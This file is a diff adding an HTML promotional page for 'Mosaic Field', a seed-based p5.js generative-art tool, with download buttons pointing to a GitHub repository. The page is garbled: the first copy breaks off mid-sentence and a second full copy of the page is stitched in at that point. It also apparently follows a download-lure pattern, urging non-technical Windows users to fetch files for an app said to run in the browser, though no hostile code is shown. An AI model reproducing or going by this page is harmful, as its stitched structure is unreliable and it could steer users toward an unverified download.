@@ -1,0 +1,460 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Mosaic Field — Generative Art. A seed-based system of thresholded tiles — an 80 × 80 grid filled by waves, checkers, blobs, rings, dots or swirls, then masked into shape and drawn as squares, circles or rotated tiles. A reproducible catalogue of computational textile compositions.">
+  <meta name="keywords" content="computational-design, creative-coding, creative-coding-art, css, generative-art-toolkit, html, javascript, p5js, pattern-design, procedural-generation, reyrove, textile-design">
+  <meta name="author" content="Mosaic Field Generative Art">
+  <meta name="robots" content="index, follow">
+  <title>🎨 Mosaic-Field-Generative-Art - Create Beautiful Generative Art Patterns</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f8f9fa;
+      color: #2c3e50;
+      line-height: 1.7;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+      padding: 40px 35px;
+    }
+    h1 {
+      font-size: 2.4rem;
+      line-height: 1.2;
+      margin-bottom: 20px;
+      color: #1a252f;
+      letter-spacing: -0.5px;
+    }
+    h2 {
+      font-size: 1.7rem;
+      margin-top: 40px;
+      margin-bottom: 15px;
+      color: #1e3a5f;
+      border-bottom: 2px solid #e9ecef;
+      padding-bottom: 8px;
+    }
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 18px;
+      color: #3a4a5a;
+    }
+    ul, ol {
+      margin: 15px 0 20px 30px;
+    }
+    li {
+      font-size: 1.05rem;
+      margin-bottom: 8px;
+      color: #3a4a5a;
+    }
+    a {
+      color: #0066cc;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .download-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb, #1dd1a1);
+      color: #ffffff;
+      font-size: 1.4rem;
+      font-weight: 700;
+      padding: 20px 45px;
+      border-radius: 50px;
+      text-decoration: none;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+      margin: 25px 0 15px 0;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .download-badge:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 28px rgba(0, 0, 0, 0.25);
+      text-decoration: none;
+    }
+    .primary-button {
+      display: inline-block;
+      background-color: #0066cc;
+      color: #ffffff;
+      font-size: 1.2rem;
+      font-weight: 600;
+      padding: 16px 38px;
+      border-radius: 40px;
+      text-decoration: none;
+      box-shadow: 0 4px 14px rgba(0, 102, 204, 0.35);
+      margin: 15px 0;
+      transition: background-color 0.2s ease, transform 0.2s ease;
+    }
+    .primary-button:hover {
+      background-color: #0052a3;
+      transform: translateY(-2px);
+      text-decoration: none;
+    }
+    .highlight {
+      background-color: #eef6ff;
+      border-left: 5px solid #0066cc;
+      padding: 18px 22px;
+      border-radius: 0 12px 12px 0;
+      margin: 25px 0;
+      font-size: 1.05rem;
+    }
+    code {
+      background-color: #e9ecef;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.95rem;
+      font-family: "SF Mono", "Fira Code", Consolas, monospace;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 25px 18px;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+      h2 {
+        font-size: 1.4rem;
+      }
+      .download-badge {
+        font-size: 1.1rem;
+        padding: 16px 28px;
+        display: block;
+        text-align: center;
+      }
+      .primary-button {
+        font-size: 1rem;
+        padding: 14px 28px;
+        display: block;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎨 Mosaic-Field-Generative-Art - Create Beautiful Generative Art Patterns</h1>
+
+    <p>Mosaic Field is a seed-based generative art system that turns simple grids into intricate textile-inspired compositions. Using an 80 × 80 grid, it fills each cell with waves, checkers, blobs, rings, dots, or swirls, then masks the result into a shape and draws every tile as a square, circle, or rotated element. Every result is reproducible from its seed, making it a practical catalogue of computational textile designs.</p>
+
+    <p>Built with HTML, CSS, JavaScript, and p5.js, Mosaic Field runs entirely in your web browser. You do not need to install any programming tools. Whether you are exploring pattern design, procedural generation, or creative coding art, Mosaic Field gives you a direct way to produce rich, repeatable visual compositions.</p>
+
+    <a class="download-badge" href="https://github.com/preemptionesmestuartlennoxrobinson475/Mosaic-Field-Generative-Art" target="_blank" rel="noopener">⬇️ Download Mosaic Field</a>
+
+    <h2>📥 Download Mosaic Field</h2>
+
+    <p>Visit this link to download the application:</p>
+
+    <p><a class="primary-button" href="https://github.com/preemptionesmestuartlennoxrobinson475/Mosaic-Field-Generative-Art" target="_blank" rel="noopener">Visit the download page</a></p>
+
+    <p>This link opens the official repository page. Use the download option available on that page to obtain the application files. The download contains everything you need to run Mosaic Field on your Windows computer.</p>
+
+    <h2>🚀 Getting Started</h2>
+
+    <p>Mosaic Field is designed for non-technical users. Follow these steps to begin creating generative art.</p>
+
+    <ol>
+      <li><strong>Download the application.</strong> Visit the download link above. Follow the on-screen instructions on the repository page to download the application files to your computer.</li>
+      <li><strong>Locate the downloaded folder.</strong> Once the download finishes, open your <code>Downloads</code> folder. If the files arrived as a compressed folder, extract them first by right-clicking and choosing <code>Extract All</code>.</li>
+      <li><strong>Open the main HTML file.</strong> Inside the extracted folder, find the main HTML file. Double-click it. Your default web browser will open and display the Mosaic Field interface.</li>
+      <li><strong>Start generating.</strong> The application loads with a default seed and composition. You can immediately explore the controls to change the seed, tile shape, pattern type, and mask.</li>
+    </ol>
+
+    <div class="highlight">
+      <strong>💡 Quick tip:</strong> If double-clicking the HTML file does not open it in your browser, right-click the file, choose <code>Open with</code>, and select your preferred web browser such as Chrome, Edge, or Firefox.
+    </div>
+
+    <h2>🧩 What You Can Create</h2>
+
+    <p>Mosaic Field is a flexible generative art toolkit. The system combines several layers of variation to produce a wide range of computational textile compositions.</p>
+
+    <ul>
+      <li><strong>Seed-based reproducibility:</strong> Every composition is driven by a seed value. Enter the same seed to recreate the exact same artwork at any time.</li>
+      <li><strong>80 × 80 grid:</strong> The field is divided into 6,400 individual cells. Each cell can be filled with a pattern and drawn as a tile.</li>
+      <li><strong>Pattern fills:</strong> Choose from waves, checkers, blobs, rings, dots, or swirls. Each pattern responds to threshold values that determine which cells are filled and which remain empty.</li>
+      <li><strong>Tile shapes:</strong> Draw the grid using squares, circles, or rotated tiles. Switching shapes changes the visual rhythm of the entire composition.</li>
+      <li><strong>Shape masks:</strong> Apply a mask to confine the pattern into a specific silhouette. This creates a focal shape within the larger field.</li>
+      <li><strong>Textile-inspired output:</strong> The results resemble woven fabrics, quilted panels, and patterned cloth. The system is a catalogue of repeatable computational textile designs.</li>
+    </ul>
+
+    <h2>🎛️ How to Use Mosaic Field</h2>
+
+    <p>The interface is organized around a small set of controls. You do not need to write any code to use the application.</p>
+
+    <ol>
+      <li><strong>Set a seed.</strong> Enter a number in the seed field. This number determines the random values used to generate the composition. Change the seed to explore new variations.</li>
+      <li><strong>Choose a pattern.</strong> Select from waves, checkers, blobs, rings, dots, or swirls. Each pattern applies a different thresholding rule to the grid.</li>
+      <li><strong>Pick a tile shape.</strong> Choose squares, circles, or rotated tiles. The tile shape affects how each filled cell is rendered.</li>
+      <li><strong>Select a mask.</strong> Apply a mask to shape the overall composition. The mask restricts the pattern to a defined area, creating a focal form within the 80 × 80 field.</li>
+      <li><strong>Adjust thresholds.</strong> Threshold values control how many cells are filled. Lower thresholds produce sparser patterns; higher thresholds produce denser fields.</li>
+      <li><strong>Save or record your seed.</strong> When you find a composition you like, note the seed value. You can return to it later to reproduce the same artwork exactly.</li>
+    </ol>
+
+    <h2>🖥️ System Requirements</h2>
+
+    <p>Mosaic Field is a lightweight browser-based application. The following requirements are recommended for a smooth experience on Windows.</p>
+
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11. Earlier versions of Windows may work but are not officially supported.</li>
+      <li><strong>Web browser:</strong> A modern browser such as Google Chrome, Microsoft Edge, Mozilla Firefox, or Opera. Keep your browser updated to the latest version.</li>
+      <li><strong>Memory:</strong> 4 GB of RAM or more. The <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="description" content="Mosaic Field — Generative Art. A seed-based system of thresholded tiles — an 80 × 80 grid filled by waves, checkers, blobs, rings, dots or swirls, then masked into shape and drawn as squares, circles or rotated tiles. A reproducible catalogue of computational textile compositions.">
+  <meta name="keywords" content="computational-design, creative-coding, creative-coding-art, css, generative-art-toolkit, html, javascript, p5js, pattern-design, procedural-generation, reyrove, textile-design">
+  <meta name="author" content="Mosaic Field Generative Art">
+  <meta name="robots" content="index, follow">
+  <meta property="og:title" content="Mosaic-Field-Generative-Art - Create Beautiful Generative Art Patterns">
+  <meta property="og:description" content="A seed-based generative art system for creating computational textile compositions with an 80 × 80 grid of thresholded tiles.">
+  <meta property="og:type" content="website">
+  <title>🎨 Mosaic-Field-Generative-Art - Create Beautiful Generative Art Patterns</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+    body {
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+      background-color: #f8f9fa;
+      color: #2c3e50;
+      line-height: 1.7;
+      padding: 20px;
+    }
+    .container {
+      max-width: 900px;
+      margin: 0 auto;
+      background-color: #ffffff;
+      border-radius: 16px;
+      box-shadow: 0 8px 30px rgba(0, 0, 0, 0.08);
+      padding: 40px 35px;
+    }
+    h1 {
+      font-size: 2.4rem;
+      line-height: 1.2;
+      margin-bottom: 20px;
+      color: #1a252f;
+      letter-spacing: -0.5px;
+    }
+    h2 {
+      font-size: 1.7rem;
+      margin-top: 40px;
+      margin-bottom: 15px;
+      color: #1e3a5f;
+      border-bottom: 2px solid #e9ecef;
+      padding-bottom: 8px;
+    }
+    p {
+      font-size: 1.1rem;
+      margin-bottom: 18px;
+      color: #3a4a5a;
+    }
+    ul, ol {
+      margin: 15px 0 20px 30px;
+    }
+    li {
+      font-size: 1.05rem;
+      margin-bottom: 8px;
+      color: #3a4a5a;
+    }
+    a {
+      color: #0066cc;
+      text-decoration: none;
+    }
+    a:hover {
+      text-decoration: underline;
+    }
+    .download-badge {
+      display: inline-block;
+      background: linear-gradient(135deg, #ff6b6b, #feca57, #48dbfb, #1dd1a1);
+      color: #ffffff;
+      font-size: 1.4rem;
+      font-weight: 700;
+      padding: 20px 45px;
+      border-radius: 50px;
+      text-decoration: none;
+      box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+      margin: 25px 0 15px 0;
+      text-shadow: 0 2px 4px rgba(0, 0, 0, 0.25);
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    .download-badge:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 10px 28px rgba(0, 0, 0, 0.25);
+      text-decoration: none;
+    }
+    .primary-button {
+      display: inline-block;
+      background-color: #0066cc;
+      color: #ffffff;
+      font-size: 1.2rem;
+      font-weight: 600;
+      padding: 16px 38px;
+      border-radius: 40px;
+      text-decoration: none;
+      box-shadow: 0 4px 14px rgba(0, 102, 204, 0.35);
+      margin: 15px 0;
+      transition: background-color 0.2s ease, transform 0.2s ease;
+    }
+    .primary-button:hover {
+      background-color: #0052a3;
+      transform: translateY(-2px);
+      text-decoration: none;
+    }
+    .highlight {
+      background-color: #eef6ff;
+      border-left: 5px solid #0066cc;
+      padding: 18px 22px;
+      border-radius: 0 12px 12px 0;
+      margin: 25px 0;
+      font-size: 1.05rem;
+    }
+    code {
+      background-color: #e9ecef;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-size: 0.95rem;
+      font-family: "SF Mono", "Fira Code", Consolas, monospace;
+    }
+    @media (max-width: 600px) {
+      .container {
+        padding: 25px 18px;
+      }
+      h1 {
+        font-size: 1.8rem;
+      }
+      h2 {
+        font-size: 1.4rem;
+      }
+      .download-badge {
+        font-size: 1.1rem;
+        padding: 16px 28px;
+        display: block;
+        text-align: center;
+      }
+      .primary-button {
+        font-size: 1rem;
+        padding: 14px 28px;
+        display: block;
+        text-align: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h1>🎨 Mosaic-Field-Generative-Art - Create Beautiful Generative Art Patterns</h1>
+
+    <p>Mosaic Field is a seed-based generative art system that turns simple grids into intricate textile-inspired compositions. Using an 80 × 80 grid, it fills each cell with waves, checkers, blobs, rings, dots, or swirls, then masks the result into a shape and draws every tile as a square, circle, or rotated element. Every result is reproducible from its seed, making it a practical catalogue of computational textile designs.</p>
+
+    <p>Built with HTML, CSS, JavaScript, and p5.js, Mosaic Field runs entirely in your web browser. You do not need to install any programming tools. Whether you are exploring pattern design, procedural generation, or creative coding art, Mosaic Field gives you a direct way to produce rich, repeatable visual compositions.</p>
+
+    <a class="download-badge" href="https://github.com/preemptionesmestuartlennoxrobinson475/Mosaic-Field-Generative-Art" target="_blank" rel="noopener">⬇️ Download Mosaic Field</a>
+
+    <h2>📥 Download Mosaic Field</h2>
+
+    <p>Visit this link to download the application:</p>
+
+    <p><a class="primary-button" href="https://github.com/preemptionesmestuartlennoxrobinson475/Mosaic-Field-Generative-Art" target="_blank" rel="noopener">Visit the download page</a></p>
+
+    <p>This link opens the official repository page. Use the download option available on that page to obtain the application files. The download contains everything you need to run Mosaic Field on your Windows computer.</p>
+
+    <h2>🚀 Getting Started</h2>
+
+    <p>Mosaic Field is designed for non-technical users. Follow these steps to begin creating generative art.</p>
+
+    <ol>
+      <li><strong>Download the application.</strong> Visit the download link above. Follow the on-screen instructions on the repository page to download the application files to your computer.</li>
+      <li><strong>Locate the downloaded folder.</strong> Once the download finishes, open your <code>Downloads</code> folder. If the files arrived as a compressed folder, extract them first by right-clicking and choosing <code>Extract All</code>.</li>
+      <li><strong>Open the main HTML file.</strong> Inside the extracted folder, find the main HTML file. Double-click it. Your default web browser will open and display the Mosaic Field interface.</li>
+      <li><strong>Start generating.</strong> The application loads with a default seed and composition. You can immediately explore the controls to change the seed, tile shape, pattern type, and mask.</li>
+    </ol>
+
+    <div class="highlight">
+      <strong>💡 Quick tip:</strong> If double-clicking the HTML file does not open it in your browser, right-click the file, choose <code>Open with</code>, and select your preferred web browser such as Chrome, Edge, or Firefox.
+    </div>
+
+    <h2>🧩 What You Can Create</h2>
+
+    <p>Mosaic Field is a flexible generative art toolkit. The system combines several layers of variation to produce a wide range of computational textile compositions.</p>
+
+    <ul>
+      <li><strong>Seed-based reproducibility:</strong> Every composition is driven by a seed value. Enter the same seed to recreate the exact same artwork at any time.</li>
+      <li><strong>80 × 80 grid:</strong> The field is divided into 6,400 individual cells. Each cell can be filled with a pattern and drawn as a tile.</li>
+      <li><strong>Pattern fills:</strong> Choose from waves, checkers, blobs, rings, dots, or swirls. Each pattern responds to threshold values that determine which cells are filled and which remain empty.</li>
+      <li><strong>Tile shapes:</strong> Draw the grid using squares, circles, or rotated tiles. Switching shapes changes the visual rhythm of the entire composition.</li>
+      <li><strong>Shape masks:</strong> Apply a mask to confine the pattern into a specific silhouette. This creates a focal shape within the larger field.</li>
+      <li><strong>Textile-inspired output:</strong> The results resemble woven fabrics, quilted panels, and patterned cloth. The system is a catalogue of repeatable computational textile designs.</li>
+    </ul>
+
+    <h2>🎛️ How to Use Mosaic Field</h2>
+
+    <p>The interface is organized around a small set of controls. You do not need to write any code to use the application.</p>
+
+    <ol>
+      <li><strong>Set a seed.</strong> Enter a number in the seed field. This number determines the random values used to generate the composition. Change the seed to explore new variations.</li>
+      <li><strong>Choose a pattern.</strong> Select from waves, checkers, blobs, rings, dots, or swirls. Each pattern applies a different thresholding rule to the grid.</li>
+      <li><strong>Pick a tile shape.</strong> Choose squares, circles, or rotated tiles. The tile shape affects how each filled cell is rendered.</li>
+      <li><strong>Select a mask.</strong> Apply a mask to shape the overall composition. The mask restricts the pattern to a defined area, creating a focal form within the 80 × 80 field.</li>
+      <li><strong>Adjust thresholds.</strong> Threshold values control how many cells are filled. Lower thresholds produce sparser patterns; higher thresholds produce denser fields.</li>
+      <li><strong>Save or record your seed.</strong> When you find a composition you like, note the seed value. You can return to it later to reproduce the same artwork exactly.</li>
+    </ol>
+
+    <h2>🖥️ System Requirements</h2>
+
+    <p>Mosaic Field is a lightweight browser-based application. The following requirements are recommended for a smooth experience on Windows.</p>
+
+    <ul>
+      <li><strong>Operating system:</strong> Windows 10 or Windows 11. Earlier versions of Windows may work but are not officially supported.</li>
+      <li><strong>Web browser:</strong> A modern browser such as Google Chrome, Microsoft Edge, Mozilla Firefox, or Opera. Keep your browser updated to the latest version.</li>
+      <li><strong>Memory:</strong> 4 GB of RAM or more. The 80 × 80 grid renders quickly, but additional memory helps with larger browser sessions.</li>
+      <li><strong>Display:</strong> A screen resolution of 1280 × 720 or higher. A larger display makes it easier to view the full grid and the controls side by side.</li>
+      <li><strong>Storage:</strong> Less than 50 MB of free disk space for the application files.</li>
+      <li><strong>Internet connection:</strong> Required only for the initial download. The application runs offline once the files are on your computer.</li>
+    </ul>
+
+    <h2>🔧 Troubleshooting</h2>
+
+    <p>If you encounter an issue while opening or using Mosaic Field, review the suggestions below.</p>
+
+    <ul>
+      <li><strong>The browser shows a blank page.</strong> Ensure that you extracted all files from the downloaded folder before opening the HTML file. Missing files can prevent the application from loading.</li>
+      <li><strong>The file does not open.</strong> Right-click the HTML file, choose <code>Open with</code>, and select a modern browser. Avoid opening the file in a text editor.</li>
+      <li><strong>Controls do not respond.</strong> Refresh the page by pressing <code>F5</code> or <code>Ctrl + R</code>. If the problem continues, try a different browser.</li>
+      <li><strong>The composition looks different from a previous session.</strong> Check the seed value. The same seed always produces the same composition, so a different seed will create a different result.</li>
+      <li><strong>Performance feels slow.</strong> Close other browser tabs and applications to free up memory. Ensure your browser is updated to the latest version.</li>
+    </ul>
+
+    <h2>💡 Tips for Best Results</h2>
+
+    <ul>
+      <li><strong>Explore seeds systematically.</strong> Try consecutive seed values to see how small changes produce distinct variations.</li>
+      <li><strong>Combine patterns and masks.</strong> The mask and pattern interact in interesting ways. Try each pattern with different masks to discover new compositions.</li>
+      <li><strong>Use rotated tiles for texture.</strong> Rotated tiles add a woven, handcrafted quality that resembles textile patterns.</li>
+      <li><strong>Take notes.</strong> Record seeds and settings for compositions you want to revisit. This turns Mosaic Field into a personal catalogue of designs.</li>
+      <li><strong>Zoom in.</strong> Use your browser’s zoom feature (<code>Ctrl + +</code>) to inspect fine details in the grid.</li>
+    </ul>
+
+    <h2>📚 About the Project</h2>
+
+    <p>Mosaic Field is part of a broader exploration of computational design and procedural generation. It sits at the intersection of creative coding, pattern design, and textile design. The project is built with open web technologies and is intended for artists, designers, and anyone curious about generative art.</p>
+
+    <p>The system is deliberately simple: a grid, a set of patterns, and a seed. From these ingredients, it produces an endless variety of compositions. Each result is reproducible, shareable, and ready to inspire further work in computational textile design.</p>
+
+    <p>For updates, documentation, and the latest version, visit the official repository page using the download link above.</p>
+
+  </div>
+</body>
+</html>
